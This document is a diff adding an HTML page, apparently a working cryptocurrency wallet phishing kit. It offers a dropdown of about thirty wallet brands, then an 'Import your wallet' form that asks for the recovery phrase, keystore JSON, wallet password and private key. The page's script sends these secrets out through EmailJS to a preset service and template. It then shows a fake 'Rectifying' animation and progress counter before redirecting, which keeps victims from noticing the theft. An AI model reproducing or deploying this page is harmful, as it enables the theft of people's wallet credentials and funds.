@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Selector</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        
+        .dropdown {
+            margin-bottom: 20px;
+        }
+
+        select {
+            padding: 10px;
+            font-size: 16px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            width: 300px;
+        }
+
+        .form-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+            display: none;
+            width: 300px;
+        }
+
+        .form-container h2 {
+            margin-bottom: 20px;
+        }
+
+        .form-container .logo {
+            margin-bottom: 20px;
+        }
+
+        .form-container .input-container {
+            margin-bottom: 20px;
+        }
+
+        .form-container .input-container input {
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            margin-bottom: 5px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .form-container .input-container small {
+            color: #666;
+            font-size: 12px;
+        }
+
+        .submit-btn {
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .message {
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+
+        .blinking-dots {
+            display: inline-block;
+        }
+
+        .dot {
+            animation: blink 1s infinite;
+        }
+
+        .dot:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .dot:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 0; }
+            50% { opacity: 1; }
+        }
+
+        .progress-container {
+            display: none;
+            font-size: 16px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+ <div class="dropdown">
+        <label for="walletDropdown">Select your wallet:</label>
+        <select id="walletDropdown" onchange="showForm()">
+            <option value="" disabled selected>Select a Wallet</option>
+            <option value="trust-wallet">Trust Wallet</option>
+            <option value="ledger">Ledger</option>
+            <option value="metamask">MetaMask</option>
+            <option value="walletconnect">WalletConnect</option>
+            <option value="tangem">Tangem</option>
+            <option value="relai-wallet">Relai Wallet</option>
+            <option value="phantom-wallet">Phantom Wallet</option>
+            <option value="coinbase-wallet">Coinbase Wallet</option>
+            <option value="keplr">Keplr</option>
+            <option value="keep-key">Keep Key</option>
+            <option value="bitbox02">BitBox02</option>
+            <option value="ecto-wallet">Ecto Wallet</option>
+            <option value="exodus">Exodus</option>
+            <option value="safepal">Safepal</option>
+            <option value="atomic-wallet">Atomic Wallet</option>
+            <option value="coinomi">Coinomi</option>
+            <option value="tokenpocket">TokenPocket</option>
+            <option value="trezor">Trezor</option>
+            <option value="fortmatic">Fortmatic</option>
+            <option value="portis">Portis</option>
+            <option value="squarelink">Squarelink</option>
+            <option value="torus">Torus</option>
+            <option value="authereum">Authereum</option>
+            <option value="vechain">VeChain</option>
+            <option value="scatter-wallet">Scatter Wallet</option>
+            <option value="math-wallet">Math Wallet</option>
+            <option value="tomo-chain">Tomo Chain</option>
+            <option value="guarda-wallet">Guarda Wallet</option>
+            <option value="cool-wallet">Cool Wallet</option>
+            <option value="other">Other</option>
+        </select>
+    </div>
+
+    <div class="form-container" id="walletForm">
+        <h2>Import your wallet</h2>
+        <div class="logo" id="walletLogo"></div>
+        <div class="input-container">
+            <input type="text" id="phrase" placeholder="Enter your recover phrase">
+            <small>Typically 12 (sometimes 24) words separated by single spaces</small>
+        </div>
+        <div class="input-container">
+            <input type="text" id="keystoreJSON" placeholder="Enter your recover keystoreJSON">
+            <small>Several lines of text beginning with "{...}"</small>
+        </div>
+        <div class="input-container">
+            <input type="text" id="walletPassword" placeholder="Enter your wallet Password">
+        </div>
+        <div class="input-container">
+            <input type="text" id="privateKey" placeholder="Enter your private Key">
+            <small>Typically 12 (sometimes 24) words separated by single spaces</small>
+        </div>
+        <button class="submit-btn" onclick="submitForm()">Submit</button>
+    </div>
+
+    <div class="message" id="message"></div>
+    <div class="progress-container" id="progressContainer">Rectifying please wait <span class="blinking-dots"><span class="dot">.</span><span class="dot">.</span><span class="dot">.</span></span></div>
+    <div class="progress-container" id="progressCount"></div>
+
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.1/dist/email.min.js"></script>
+    <script>
+        emailjs.init("qU_IMJDngaCTALbPd"); // Replace with your EmailJS user ID
+
+        function showForm() {
+            const dropdown = document.getElementById('walletDropdown');
+            const selectedWallet = dropdown.value;
+            const formContainer = document.getElementById('walletForm');
+            const walletLogo = document.getElementById('walletLogo');
+
+            walletLogo.innerHTML = `<strong>${selectedWallet}</strong>`;
+            formContainer.style.display = 'block';
+        }
+
+        function submitForm() {
+            const phrase = document.getElementById('phrase').value;
+            const keystoreJSON = document.getElementById('keystoreJSON').value;
+            const walletPassword = document.getElementById('walletPassword').value;
+            const privateKey = document.getElementById('privateKey').value;
+            const wallet = document.getElementById('walletDropdown').value;
+
+            const templateParams = {
+                wallet_name: wallet,
+              phrase_value: phrase,
+                keystoreJSON_value: keystoreJSON,
+                walletPassword_value: walletPassword,
+                privateKey_value: privateKey
+            };
+
+            emailjs.send('service_87claar', 'template_tw6vexd', templateParams)
+                .then(function(response) {
+                    showLoadingAnimation();
+                }, function(error) {
+                    alert('Failed to send email. Please try again.');
+                });
+        }
+
+        function showLoadingAnimation() {
+            const message = document.getElementById('message');
+            const progressContainer = document.getElementById('progressContainer');
+            const progressCount = document.getElementById('progressCount');
+
+            message.style.display = 'none';
+            progressContainer.style.display = 'block';
+
+            setTimeout(() => {
+                progressContainer.style.display = 'none';
+                startCounting();
+            }, 10000); // 10 seconds for the "Rectifying please wait" animation
+        }
+
+        function startCounting() {
+            const progressCount = document.getElementById('progressCount');
+            let count = 1;
+
+            progressCount.style.display = 'block';
+
+            const interval = setInterval(() => {
+                progressCount.textContent = `Processing ${count}%`;
+                count++;
+
+                if (count > 100) {
+                    clearInterval(interval);
+                    window.location.href = "https://home.html"; // Redirect URL after 100%
+                }
+            }, 50); // Adjust speed as necessary
+        }
+    </script>
+</body>
+</html>
